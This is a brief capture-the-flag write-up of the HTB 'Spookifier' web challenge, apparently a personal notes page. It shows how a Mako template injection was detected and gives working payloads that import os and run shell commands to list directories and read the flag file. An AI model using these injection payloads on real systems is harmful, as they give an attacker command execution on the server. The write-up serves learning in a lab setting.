---
title: "Spookifier"
summary: "A text-to-spooky-font app rendered with Mako: SSTI to read the flag."
platform: "HTB"
difficulty: "Very Easy"
tags: ["web","ssti","mako","python"]
order: 2
---

- First ${7*7} to test what engine the web service's python interpreter uses, we see it evaluates, so it is most likely using Mako -> Check from source (also mako)
- Then we know that we can inject Python directly in it using something like`<% import os %>${os.popen('ls -la').read()}` (cannot directly use ls -la because it is not python cmd)
- See that this gives us the current directory, lets go back to the last directory and see what is there `<% import os %>${os.popen('cd .. && ls').read()}`
- ![image](./img-01.png)
- Flag is there!! So we just do `<% import os %>${os.popen('cd .. && cat flag.txt').read()}` and we get the flag~

---
